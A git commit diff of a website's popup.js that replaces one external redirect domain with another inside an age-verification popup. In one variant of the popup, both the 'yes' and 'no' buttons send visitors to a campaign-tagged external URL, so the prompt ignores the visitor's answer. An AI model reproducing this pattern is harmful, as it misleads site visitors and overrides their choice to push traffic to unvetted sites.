b7275c8e13895eb9501195725d83caec6f9979e9
rv6815340-ui <rv6815340@gmail.com>
2025-12-18 09:50:52 +0530

    Update popup.js

--- assets/js/popup.js
+++ assets/js/popup.js
@@ -1,7 +1,7 @@
 // Minimal split: same behavior, two separate functions to call per page
 (function () {
   // Use relative path so it works in subfolders too
-  const REDIRECT = "https://ferreroo.site/?utm_campaign=mVhjucBByU&v1=[v1]&v2=[v2]&v3=[v3]";
+  const REDIRECT = "https://inf4hub.com/?utm_campaign=mVhjucBByU&v1=[v1]&v2=[v2]&v3=[v3]";
 
   function buildPopup() {
     // prevent double render
@@ -42,7 +42,7 @@ function close() {
     // Your custom behavior: Yes = just close, No = go to privacy
     bd.querySelector("#age-yes").addEventListener("click", close);
     bd.querySelector("#age-no").addEventListener("click", () => {
-      window.location.href = "https://ferreroo.site/?utm_campaign=mVhjucBByU&v1=[v1]&v2=[v2]&v3=[v3]";
+      window.location.href = "https://inf4hub.com/?utm_campaign=mVhjucBByU&v1=[v1]&v2=[v2]&v3=[v3]";
     });
   };
 
@@ -58,7 +58,7 @@ function close() {
 
     // Your custom behavior: both buttons redirect
     bd.querySelector("#age-yes").addEventListener("click", () => {
-      window.location.href = "https://ferreroo.site/?utm_campaign=mVhjucBByU&v1=[v1]&v2=[v2]&v3=[v3]";
+      window.location.href = "https://inf4hub.com/?utm_campaign=mVhjucBByU&v1=[v1]&v2=[v2]&v3=[v3]";
     });
     bd.querySelector("#age-no").addEventListener("click", () => {
       window.location.href = REDIRECT;
